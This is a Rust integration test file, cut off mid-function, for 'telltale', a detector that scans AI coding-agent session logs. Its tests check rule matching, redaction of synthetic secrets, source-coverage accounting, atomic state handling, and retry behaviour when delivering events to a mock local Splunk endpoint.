use super::*;

static WATCH_PROCESS_MUTEX: std::sync::Mutex<()> = std::sync::Mutex::new(());

#[test]
fn canonical_efficacy_fixtures_cli_characterization_and_event_privacy() {
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).unwrap();
    let validator = validator_for(&schema).unwrap();
    let manifest: Value =
        serde_yaml::from_str(include_str!("../evaluation/manifest.yaml")).unwrap();
    for case in manifest["cases"].as_array().unwrap().iter().filter(|case| {
        case["tags"]
            .as_array()
            .unwrap()
            .iter()
            .any(|tag| tag == "canonical_efficacy")
    }) {
        let temp = tempdir().unwrap();
        let root = temp.path().join("stores");
        let directory = root.join("codex/sessions");
        fs::create_dir_all(&directory).unwrap();
        let fixture =
            Path::new(env!("CARGO_MANIFEST_DIR")).join(case["input"]["fixture"].as_str().unwrap());
        let input = fs::read_to_string(fixture).unwrap();
        let source = directory.join("synthetic.jsonl");
        fs::write(&source, &input).unwrap();
        let log = temp.path().join("events.jsonl");
        let state = temp.path().join("state.json");
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--emit-activity",
                "--client",
                "codex",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}: {}",
            case["id"],
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
        let expected = case["expected_detection"]["expected_score"]
            .as_u64()
            .unwrap();
        assert_eq!(
            summary["detection_count"],
            u64::from(expected > 0),
            "{}",
            case["id"]
        );
        let persisted = fs::read_to_string(&log).unwrap();
        let events = persisted
            .lines()
            .map(|line| serde_json::from_str::<Value>(line).unwrap())
            .collect::<Vec<_>>();
        assert!(!events.is_empty());
        for event in &events {
            assert!(validator.is_valid(event), "{}: {event}", case["id"]);
        }
        let detections = events
            .iter()
            .filter(|event| event["event_type"] == "detection")
            .collect::<Vec<_>>();
        assert_eq!(detections.len(), usize::from(expected > 0));
        if let Some(detection) = detections.first() {
            assert_eq!(detection["risk_score"], expected);
            let rules = case["expected_detection"]["rule_expectations"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|rule| rule["expectation"] == "expected_match")
                .map(|rule| rule["rule_id"].clone())
                .collect::<Vec<_>>();
            assert_eq!(detection["rule_ids"], serde_json::json!(rules));
            assert_eq!(
                detection["timeline_anchors"].as_array().unwrap().len(),
                1,
                "mirrors must not double analytic evidence"
            );
        }
        for bytes in [
            output.stdout,
            output.stderr,
            persisted.into_bytes(),
            fs::read(&state).unwrap(),
        ] {
            assert!(
                !String::from_utf8_lossy(&bytes).contains("SYNTHETIC-EFFICACY-PRIVATE"),
                "{}",
                case["id"]
            );
        }
        assert_eq!(fs::read_to_string(source).unwrap(), input);
    }
}

#[test]
fn scan_dry_run_reports_selected_source_coverage_without_private_details() {
    let temp = tempdir().unwrap();
    let root = temp.path().join("PRIVATE-COVERAGE-PATH");
    let directory = root.join("codex/sessions");
    fs::create_dir_all(&directory).unwrap();
    let source = directory.join("PRIVATE-COVERAGE-ID.jsonl");
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    let rules = temp.path().join("rules.yaml");
    fs::write(&rules, "version: 1\ndescription: synthetic\ndefaults:\n  case_insensitive: false\n  enabled: true\nrules:\n  - id: synthetic.coverage\n    category: synthetic\n    detection_class: security_detection\n    signal_type: atomic\n    analytic_intent: alert\n    severity: low\n    score: 1\n    detection:\n      selection: {user_context: NEVER-MATCH}\n      condition: selection\n    tags: [synthetic]\n    explanation: synthetic\nmodifiers: []\n").unwrap();
    let scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--dry-run",
                "--allow-fixtures",
                "--no-local-config",
                "--no-default-rules",
                "--install-inventory-disabled",
                "--root",
            ])
            .arg(&root)
            .arg("--rules")
            .arg(&rules)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "source rejection is not globally fatal: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(!log.exists());
        assert!(!state.exists());
        let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
        let diagnostics = serde_json::json!({"source_processing": summary["source_processing"], "diagnostic_warnings": summary["diagnostic_warnings"]}).to_string();
        for marker in [
            "PRIVATE-COVERAGE-PATH",
            "PRIVATE-COVERAGE-ID",
            "PRIVATE-COVERAGE-CONTENT",
            "PRIVATE-COVERAGE-SESSION",
        ] {
            assert!(
                !String::from_utf8_lossy(&output.stdout).contains(marker),
                "stdout exposed privacy sentinel {marker}"
            );
            assert!(
                !String::from_utf8_lossy(&output.stderr).contains(marker),
                "stderr exposed privacy sentinel {marker}"
            );
            assert!(!diagnostics.contains(marker));
        }
        summary
    };
    fs::write(&source, "{\"type\":\"user\",\"session_id\":\"PRIVATE-COVERAGE-SESSION\",\"content\":\"PRIVATE-COVERAGE-CONTENT\"}\n").unwrap();
    let complete = scan();
    assert_eq!(
        complete["source_processing"]["evaluation_complete_source_count"],
        1
    );
    assert_eq!(
        complete["source_processing"]["selected_source_coverage"],
        "complete"
    );
    fs::write(
        &rules,
        fs::read_to_string(&rules)
            .unwrap()
            .replace("user_context", "url"),
    )
    .unwrap();
    let limited = scan();
    assert_eq!(
        limited["source_processing"]["visibility_limited_source_count"],
        1
    );
    assert_eq!(
        limited["source_processing"]["parse_success_source_count"],
        1
    );
    assert_eq!(
        limited["source_processing"]["accounting_complete_source_count"],
        1
    );
    assert_eq!(
        limited["source_processing"]["selected_source_coverage"],
        "partial"
    );
    assert!(
        limited["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|w| w["code"] == "source_coverage_partial")
    );
    fs::write(
        directory.join("parse.jsonl"),
        "PRIVATE-COVERAGE-CONTENT invalid json\n",
    )
    .unwrap();
    fs::write(directory.join("bound.jsonl"), format!("{}\n{}\n", serde_json::json!({"type":"user","session_id":"PRIVATE-COVERAGE-SESSION","content":"ok"}), serde_json::json!({"type":"user","session_id":"PRIVATE-COVERAGE-SESSION","content":"PRIVATE-COVERAGE-CONTENT".repeat(4000)}))).unwrap();
    let mixed = scan();
    let processing = &mixed["source_processing"];
    assert_eq!(processing["selected_source_count"], 3);
    assert_eq!(processing["parse_success_source_count"], 1);
    assert_eq!(processing["parse_error_source_count"], 2);
    assert_eq!(
        processing["parsed_record_count"], 1,
        "rejected source is atomic"
    );
    assert_eq!(processing["selected_source_coverage"], "partial");
    let failures = processing["failures"].as_array().unwrap();
    assert!(failures.iter().any(|f| f["stage"] == "Acquisition"
        && f["acquisition_code"] == "source_read"
        && f["source_count"] == 1));
    assert!(
        failures
            .iter()
            .any(|f| f["acquisition_code"] == "unbounded_value"
                && f["bound_category"] == "MessageContent"
                && f["bound_dimension"] == "StringBytes"
                && f["source_count"] == 1)
    );
    fs::remove_file(&source).unwrap();
    let rejected = scan();
    assert_eq!(
        rejected["source_processing"]["parse_success_source_count"],
        0
    );
    assert_eq!(
        rejected["source_processing"]["selected_source_coverage"],
        "partial"
    );
    assert_eq!(rejected["source_processing"]["parsed_record_count"], 0);

    #[cfg(target_os = "linux")]
    {
        fs::remove_dir_all(&directory).unwrap();
        let opencode = root.join("opencode");
        fs::create_dir_all(&opencode).unwrap();
        let database = opencode.join("opencode.db");
        let connection = Connection::open(&database).unwrap();
        connection
            .execute_batch("CREATE TABLE message (id TEXT, session_id TEXT, time_created INTEGER, time_updated INTEGER, data TEXT); CREATE TABLE part (id TEXT, message_id TEXT, session_id TEXT, time_created INTEGER, time_updated INTEGER, data TEXT);")
            .unwrap();
        drop(connection);
        let partial_accounting = scan();
        let processing = &partial_accounting["source_processing"];
        assert_eq!(processing["evaluation_complete_source_count"], 1);
        assert_eq!(processing["visibility_limited_source_count"], 0);
        assert_eq!(processing["accounting_partial_source_count"], 1);
        assert_eq!(processing["selected_source_coverage"], "partial");
        assert_eq!(processing["parse_error_source_count"], 0);
    }
}

#[test]
fn long_message_cli_suffix_parts_exclusions_roles_privacy_and_atomic_persistence() {
    let temp = tempdir().unwrap();
    let root = temp.path().join("stores");
    let directory = root.join("codex/sessions");
    fs::create_dir_all(&directory).unwrap();
    let source = directory.join("synthetic.jsonl");
    let rules = temp.path().join("rules.yaml");
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    fs::write(&rules, "version: 1\ndescription: synthetic\ndefaults:\n  case_insensitive: false\n  enabled: true\nrules:\n  - id: synthetic.long\n    category: synthetic\n    detection_class: security_detection\n    signal_type: atomic\n    analytic_intent: alert\n    severity: low\n    score: 3\n    detection:\n      selection: {user_context: 'needle|first\\nsecond'}\n      exclude: {user_context: EXCLUDE}\n      condition: selection\n    tags: [synthetic]\n    explanation: synthetic\nmodifiers: []\n").unwrap();
    let text = format!(
        "api_key=SYNTHETIC-CLI-LONG-SECRET {}needle",
        "ordinary ".repeat(1_000)
    );
    let punctuation = format!(
        "https://example.invalid/{}?token=SYNTHETIC-CLI-PUNCT-SECRET&needle=1",
        ":".repeat(4_000)
    );
    let records = [
        serde_json::json!({"type":"session_meta", "payload":{"session_id":"synthetic-session"}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":text}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":punctuation}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":[{"type":"input_text", "text":"first"}, {"type":"tool_result", "content":"needle", "tool_use_id":"synthetic-tool"}, {"type":"input_text", "text":"second"}]}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"developer", "content":[{"type":"input_text", "text":"needle"}]}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"system", "content":"needle"}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"assistant", "content":"needle"}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":format!("needle {}EXCLUDE", "ordinary ".repeat(1_000))}}),
    ];
    let input = format!(
        "{}\n",
        records
            .iter()
            .map(Value::to_string)
            .collect::<Vec<_>>()
            .join("\n")
    );
    fs::write(&source, &input).unwrap();
    let scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--no-default-rules",
                "--emit-activity",
                "--client",
                "codex",
                "--root",
            ])
            .arg(&root)
            .arg("--rules")
            .arg(&rules)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).unwrap()
    };
    let summary = scan();
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(fs::read_to_string(&source).unwrap(), input);
    let persisted = fs::read_to_string(&log).unwrap();
    assert!(!persisted.contains("SYNTHETIC-CLI-LONG-SECRET"));
    assert!(!persisted.contains("SYNTHETIC-CLI-PUNCT-SECRET"));
    let events = persisted
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .unwrap();
    assert_eq!(detection["risk_score"], 3);
    assert_eq!(detection["timeline_anchors"].as_array().unwrap().len(), 3);
    let hashes = detection["evidence"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|e| e["field"] == "user_context")
        .map(|e| e["hash"].as_str().unwrap())
        .collect::<Vec<_>>();
    assert!(hashes.contains(&evidence_hash(&text).as_str()));
    assert!(hashes.contains(&evidence_hash(&punctuation).as_str()));
    assert!(hashes.contains(&evidence_hash("first\nsecond").as_str()));
    assert_eq!(scan()["detection_count"], 1);
    let before: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    let offset = fs::metadata(&log).unwrap().len() as usize;
    let record = serde_json::json!({"type":"user", "session_id":"synthetic-session", "content":"x".repeat(65_528)}).to_string();
    fs::write(&source, format!("{}\n", vec![record; 129].join("\n"))).unwrap();
    let failed = scan();
    // CLI summary counts scanner errors in its detection stream.
    assert_eq!(failed["detection_count"], 1);
    assert_eq!(failed["activity_count"], 0);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key], "partial source committed {key}");
    }
    let persisted = fs::read_to_string(&log).unwrap();
    let late = &persisted[offset..];
    assert!(
        late.lines().any(
            |line| serde_json::from_str::<Value>(line).unwrap()["event_type"] == "scanner_error"
        )
    );
    assert!(!late.contains("SYNTHETIC-CLI-LONG-SECRET"));
    // Individually valid messages and a retained batch below 8 MiB still fail
    // atomically when repeated no-match scans exhaust source-wide work.
    let document = fs::read_to_string(&rules).unwrap();
    let header = document.split("rules:\n").next().unwrap();
    let repeated = (0..40).map(|index| format!("  - id: synthetic.no{index}\n    category: synthetic\n    severity: low\n    score: 1\n    targets: [user_context]\n    regex: NEVER-MATCH\n    tags: []\n    explanation: synthetic\n")).collect::<String>();
    fs::write(&rules, format!("{header}rules:\n{repeated}modifiers: []\n")).unwrap();
    let record = serde_json::json!({"type":"user", "session_id":"synthetic-session", "content":"x".repeat(60_000)}).to_string();
    fs::write(&source, format!("{}\n", vec![record; 128].join("\n"))).unwrap();
    let offset = fs::metadata(&log).unwrap().len() as usize;
    assert_eq!(scan()["activity_count"], 0);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key]);
    }
    let persisted = fs::read_to_string(&log).unwrap();
    let late = persisted[offset..]
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    assert!(
        late.iter()
            .any(|event| event["event_type"] == "scanner_error")
    );
    assert!(
        !late
            .iter()
            .any(|event| event["event_type"] == "detection" || event["event_type"] == "activity")
    );
    fs::write(&rules, document).unwrap();
    let record =
        serde_json::json!({"type":"user", "session_id":"synthetic-session", "content":punctuation})
            .to_string();
    fs::write(&source, format!("{}\n", vec![record; 1_024].join("\n"))).unwrap();
    let offset = fs::metadata(&log).unwrap().len() as usize;
    let failed = scan();
    assert_eq!(failed["activity_count"], 0);
    assert_eq!(failed["source_processing"]["parse_error_source_count"], 1);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key]);
    }
    let persisted = fs::read_to_string(&log).unwrap();
    assert!(!persisted.contains("SYNTHETIC-CLI-PUNCT-SECRET"));
    let late = persisted[offset..]
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    // The previous source-wide work failure has the same scanner diagnostic;
    // existing error deduplication can suppress its second persisted copy.
    assert!(
        !late
            .iter()
            .any(|event| event["event_type"] == "detection" || event["event_type"] == "activity")
    );
}

#[cfg(target_os = "linux")]
fn idle_durable_watch_case(
    first_status: u16,
    future_pending: bool,
    dry_run: bool,
    receiver_delay: Duration,
) {
    let _guard = watch_process_guard();
    let temp = tempdir().unwrap();
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).unwrap();
    let source = sessions.join("idle.jsonl");
    fs::write(&source, b"").unwrap();
    // Sibling storage under the broad --root remains supported: only actual
    // session-store roots are recursively watched.
    let log = root.join("runtime/events.jsonl");
    let state = root.join("runtime/state.json");
    let outbox = root.join("runtime/private/outbox.sqlite");
    let config = temp.path().join("config");
    fs::create_dir_all(config.join("outputs.d")).unwrap();
    let yaml = |path: &Path| {
        serde_yaml::to_string(&path.to_string_lossy())
            .unwrap()
            .trim()
            .to_owned()
    };
    let outputs = config.join("outputs.d/outputs.yaml");
    fs::write(&outputs, format!("version: 1\ndelivery:\n  policy: durable\n  outbox_path: {}\nsinks:\n  - name: canonical\n    type: jsonl\n    path: {}\n", yaml(&outbox), yaml(&log))).unwrap();
    let setup = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .arg("--config-dir")
        .arg(&config)
        .arg("--state-path")
        .arg(&state)
        .output()
        .unwrap();
    assert!(
        setup.status.success(),
        "{}",
        String::from_utf8_lossy(&setup.stderr)
    );
    let state_before = fs::read(&state).unwrap();
    let event = native_test_event(
        "activity",
        "telltale-00000000-0000-4000-8000-000000000001",
        "2026-01-01T00:00:00Z",
        "informational",
        "codex",
        "idle",
        &[],
    );
    // Complete canonical record beyond the committed ingest cursor: the crash gap.
    let mut journal = fs::OpenOptions::new().append(true).open(&log).unwrap();
    writeln!(journal, "{}", serde_json::to_string(&event).unwrap()).unwrap();
    journal.sync_all().unwrap();
    let log_before = fs::read(&log).unwrap();
    let connection = Connection::open(&outbox).unwrap();
    // Synthetic configured-identity fixture; production rejects identity changes.
    connection
        .execute(
            "UPDATE meta SET value = '[\"remote\"]' WHERE key = 'durable_sink_ids'",
            [],
        )
        .unwrap();
    let event_id: String = connection
        .query_row("SELECT event_id FROM events LIMIT 1", [], |row| row.get(0))
        .unwrap();
    let now = time::OffsetDateTime::now_utc().unix_timestamp_nanos() / 1_000_000;
    let eligible_at = now + if future_pending { 1800 } else { 0 };
    connection.execute("INSERT INTO deliveries (event_id, sink_id, state, attempt_count, next_attempt_at, updated_at) VALUES (?1, 'remote', 'pending', 0, ?2, ?3)", rusqlite::params![event_id, eligible_at as i64, now as i64]).unwrap();
    drop(connection);
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    fs::write(&outputs, format!("{}  - name: remote\n    type: splunk_hec\n    endpoint: http://{}\n    token: synthetic-idle-token\n    retry: {{ max_attempts: 2, base_delay_ms: 1500 }}\n", fs::read_to_string(&outputs).unwrap(), listener.local_addr().unwrap())).unwrap();
    let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
    command
        .args([
            "watch",
            "--allow-fixtures",
            "--iterations",
            "1",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .arg("--config-dir")
        .arg(&config)
        .arg("--state-path")
        .arg(&state)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if dry_run {
        command.arg("--dry-run");
    }
    let mut child = WatchChildGuard::new(command.spawn().unwrap());
    let started = Instant::now();
    let mut attempts = BTreeMap::<String, usize>::new();
    let mut request_timeline = Vec::new();
    let expected = match first_status {
        401 => ("blocked", 1),
        503 => ("dead", 2),
        500 => ("acked", 2),
        _ => ("acked", 1),
    };
    let delivery_state =
        Connection::open_with_flags(&outbox, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
    let mut terminal_since = None;
    thread::sleep(receiver_delay);
    loop {
        if child.child_mut().try_wait().unwrap().is_some() {
            let output = child.disarm().wait_with_output().unwrap();
            panic!(
                "idle watch exited: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
        if dry_run {
            if started.elapsed() >= Duration::from_secs(6) {
                break;
            }
        } else {
            let terminal: u32 = delivery_state.query_row(
                "SELECT COUNT(*) FROM deliveries WHERE sink_id = 'remote' AND state = ?1 AND attempt_count = ?2",
                rusqlite::params![expected.0, expected.1 as u32], |row| row.get(0),
            ).unwrap();
            if terminal == 2 {
                // Observe two more delivery intervals after the result commits,
                // rather than treating request receipt as a persisted outcome.
                let since = terminal_since.get_or_insert_with(Instant::now);
                if since.elapsed() >= Duration::from_secs(2) {
                    break;
                }
            } else {
                terminal_since = None;
            }
            assert!(
                started.elapsed() < Duration::from_secs(30),
                "terminal delivery deadline exceeded: terminal={terminal}; requests={request_timeline:?}; attempts={attempts:?}"
            );
        }
        match listener.accept() {
            Ok((mut stream, _)) => {
                assert!(!dry_run, "dry run sent telemetry");
                stream
                    .set_read_timeout(Some(Duration::from_secs(2)))
                    .unwrap();
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut length = 0;
                loop {
                    let mut line = String::new();
                    reader.read_line(&mut line).unwrap();
                    if line == "\r\n" {
                        break;
                    }
                    if let Some((name, value)) = line.split_once(':')
                        && name.eq_ignore_ascii_case("content-length")
                    {
                        length = value.trim().parse::<usize>().unwrap();
                    }
                }
                let mut body = vec![0; length];
                reader.read_exact(&mut body).unwrap();
                let body: Value = serde_json::from_slice(&body).unwrap();
                let id = body["event"]["event_id"].as_str().unwrap().to_owned();
                request_timeline.push((id.clone(), started.elapsed()));
                if future_pending && id == event_id {
                    assert!(
                        time::OffsetDateTime::now_utc().unix_timestamp_nanos() / 1_000_000
                            >= now + 1800
                    );
                }
                let count = attempts.entry(id).or_default();
                *count += 1;
                let status = if *count == 1 || first_status == 503 {
                    first_status
                } else {
                    200
                };
                write!(stream, "HTTP/1.1 {status} Test\r\nContent-Length: 10\r\nConnection: close\r\n\r\n{{\"code\":0}}").unwrap();
            }
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                thread::sleep(Duration::from_millis(25))
            }
            Err(error) => panic!("accept: {error}"),
        }
    }
    assert_eq!(fs::read(&state).unwrap(), state_before);
    assert_eq!(
        fs::read(&log).unwrap(),
        log_before,
        "idle failures must not generate events"
    );
    assert_eq!(fs::read(&source).unwrap(), b"");
    if !dry_run {
        let connection = Connection::open(&outbox).unwrap();
        let rows: Vec<(String, String, usize)> = connection
            .prepare(
                "SELECT event_id, state, attempt_count FROM deliveries WHERE sink_id = 'remote'",
            )
            .unwrap()
            .query_map([], |row| {
                Ok((row.get(0)?, row.get(1)?, row.get::<_, u32>(2)? as usize))
            })
            .unwrap()
            .collect::<Result<_, _>>()
            .unwrap();
        assert_eq!(rows.len(), 2, "startup must reconcile the JSONL crash gap");
        assert_eq!(
            rows.iter()
                .map(|row| row.0.as_str())
                .collect::<std::collections::BTreeSet<_>>(),
            std::collections::BTreeSet::from([
                event_id.as_str(),
                event["event_id"].as_str().unwrap()
            ])
        );
        assert!(
            rows.iter()
                .all(|row| row.1 == expected.0 && row.2 == expected.1),
            "rows={rows:?}; requests={request_timeline:?}; attempts={attempts:?}; elapsed={:?}",
            started.elapsed()
        );
        assert_eq!(attempts.len(), 2);
        assert!(attempts.values().all(|count| *count == expected.1));
    } else {
        assert!(attempts.is_empty());
    }
    let stop_started = Instant::now();
    assert!(
        Command::new("kill")
            .args(["-TERM", &child.id().to_string()])
            .status()
            .unwrap()
            .success()
    );
    while child.child_mut().try_wait().unwrap().is_none() {
        assert!(
            stop_started.elapsed() < Duration::from_secs(2),
            "idle shutdown stalled"
        );
        thread::sleep(Duration::from_millis(25));
    }
    let output = child.disarm().wait_with_output().unwrap();
    assert!(output.status.success());
    assert!(
        output.stdout.is_empty(),
        "idle wakeups must not emit scan summaries"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_future_pending_and_crash_gap_recover() {
    idle_durable_watch_case(500, true, false, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_attempt_budget_is_terminal() {
    idle_durable_watch_case(503, false, false, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_attempt_budget_with_delayed_receiver() {
    idle_durable_watch_case(503, false, false, Duration::from_millis(5500));
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_blocked_does_not_retry() {
    idle_durable_watch_case(401, false, false, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_dry_run_does_not_send_or_write() {
    idle_durable_watch_case(200, true, true, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_validates_before_output_activation() {
    let _guard = watch_process_guard();
    for case in [
        "dry-run",
        "overlap",
        "fixture",
        "empty-root",
        "watched-outbox",
        "watched-outbox-alias",
        "watched-outbox-alias-parent",
        "watched-log",
        "watched-state",
    ] {
        let temp = tempdir().unwrap();
        let root = temp.path().join("stores");
        fs::create_dir_all(&root).unwrap();
        if case != "empty-root" {
            fs::create_dir_all(root.join("codex/sessions")).unwrap();
        }
        let output_dir = temp.path().join("new-output");
        let watched_storage = root.join("codex/sessions/private");
        let log = if case == "watched-log" {
            watched_storage.join("events.jsonl")
        } else {
            output_dir.join("events.jsonl")
        };
        let state = if case == "watched-state" {
            watched_storage.join("state.json")
        } else if case == "overlap" {
            log.clone()
        } else {
            output_dir.join("state.json")
        };
        let outbox = if case == "watched-outbox-alias" || case == "watched-outbox-alias-parent" {
            let alias = temp.path().join("sessions-alias");
            std::os::unix::fs::symlink(root.join("codex/sessions"), &alias).unwrap();
            if case == "watched-outbox-alias-parent" {
                alias.join("../sessions/private/outbox.sqlite")
            } else {
                alias.join("private/outbox.sqlite")
            }
        } else if case == "watched-outbox" {
            watched_storage.join("outbox.sqlite")
        } else {
            output_dir.join("private/outbox.sqlite")
        };
        let config = temp.path().join("config");
        fs::create_dir_all(config.join("outputs.d")).unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        fs::write(config.join("outputs.d/outputs.yaml"), format!("version: 1\ndelivery:\n  policy: durable\n  outbox_path: {}\nsinks:\n  - name: canonical\n    type: jsonl\n    path: {}\n  - name: remote\n    type: splunk_hec\n    endpoint: http://{}\n    token: synthetic-idle-token\n", outbox.display(), log.display(), listener.local_addr().unwrap())).unwrap();
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .args(["watch", "--install-inventory-disabled", "--root"])
            .arg(&root)
            .arg("--config-dir")
            .arg(&config)
            .arg("--state-path")
            .arg(&state)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        if case == "dry-run" {
            command.arg("--dry-run");
        }
        if case != "fixture" {
            command.arg("--allow-fixtures");
        }
        let mut child = WatchChildGuard::new(command.spawn().unwrap());
        let started = Instant::now();
        if case == "dry-run" {
            thread::sleep(Duration::from_millis(1500));
            assert!(child.child_mut().try_wait().unwrap().is_none());
        } else {
            // This bounds process startup, not validation latency: no source activity is sent.
            while child.child_mut().try_wait().unwrap().is_none() {
                if started.elapsed() >= Duration::from_secs(20) {
                    child.child_mut().kill().expect("stop stalled watch");
                    let output = child.disarm().wait_with_output().unwrap();
                    panic!(
                        "{case}: watch did not reject idle configuration within 20s; stderr: {}",
                        String::from_utf8_lossy(&output.stderr)
                    );
                }
                thread::sleep(Duration::from_millis(25));
            }
            let output = child.disarm().wait_with_output().unwrap();
            assert!(!output.status.success(), "{case}");
            let stderr = String::from_utf8_lossy(&output.stderr);
            let expected = match case {
                "fixture" => "refusing to write fixture/demo",
                "empty-root" => "no existing Telltale session-store roots",
                "watched-outbox"
                | "watched-outbox-alias"
                | "watched-outbox-alias-parent"
                | "watched-log"
                | "watched-state" => "runtime storage must be outside watched session-store roots",
                _ => "overlap",
            };
            assert!(stderr.contains(expected), "{case}: {stderr}");
            assert!(
                output.stdout.is_empty(),
                "{case}: runtime notifications consumed scan iterations"
            );
        }
        assert!(
            !output_dir.exists(),
            "{case}: created output storage before activation"
        );
        assert!(
            !watched_storage.exists(),
            "{case}: activated watched runtime storage"
        );
        assert!(
            matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock)
        );
    }
}

fn watch_process_guard() -> std::sync::MutexGuard<'static, ()> {
    WATCH_PROCESS_MUTEX
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn assert_source_processing_accounting(summary: &Value) {
    let source_processing = &summary["source_processing"];
    assert_eq!(
        source_processing["selected_source_count"].as_u64().unwrap(),
        source_processing["parse_success_source_count"]
            .as_u64()
            .unwrap()
            + source_processing["parse_error_source_count"]
                .as_u64()
                .unwrap()
    );
    assert!(
        source_processing["empty_source_count"].as_u64().unwrap()
            <= source_processing["parse_success_source_count"]
                .as_u64()
                .unwrap()
    );
    let record_kind_counts = source_processing["record_kind_counts"]
        .as_object()
        .expect("record kind counts");
    let mut keys = record_kind_counts
        .keys()
        .map(String::as_str)
        .collect::<Vec<_>>();
    keys.sort_unstable();
    assert_eq!(
        keys,
        vec![
            "assistant_message",
            "other",
            "session_meta",
            "tool_call",
            "tool_result",
            "user_message",
        ]
    );
    let parsed_record_count = source_processing["parsed_record_count"].as_u64().unwrap();
    assert_eq!(
        parsed_record_count,
        record_kind_counts
            .values()
            .map(|count| count.as_u64().unwrap())
            .sum::<u64>()
    );
    assert!(record_kind_counts["user_message"].as_u64().unwrap() > 0);
    assert!(record_kind_counts["tool_call"].as_u64().unwrap() > 0);
}

fn assert_detection_flow_accounting(summary: &Value, emitted: u64, deduplicated: u64) {
    let detection_flow = &summary["detection_flow"];
    assert_eq!(
        detection_flow["effective_detection_candidate_count"],
        Value::from(emitted + deduplicated)
    );
    assert_eq!(
        detection_flow["state_deduplicated_detection_count"],
        Value::from(deduplicated)
    );
    assert_eq!(
        detection_flow["emitted_detection_count"],
        Value::from(emitted)
    );
    assert!(detection_flow["matched_rule_id_count"].as_u64().unwrap() > 0);
    assert_eq!(detection_flow["allowlist_marked_detection_count"], 0);
    assert_eq!(
        detection_flow["policy_match_accounting"]["status"],
        "not_applicable"
    );
    for field in [
        "pre_policy_detection_candidate_count",
        "fully_filtered_detection_candidate_count",
        "filtered_rule_id_count",
    ] {
        assert!(
            detection_flow["policy_match_accounting"][field].is_null(),
            "{field} should be unavailable"
        );
    }
}

fn assert_runtime_snapshot(summary: &Value) {
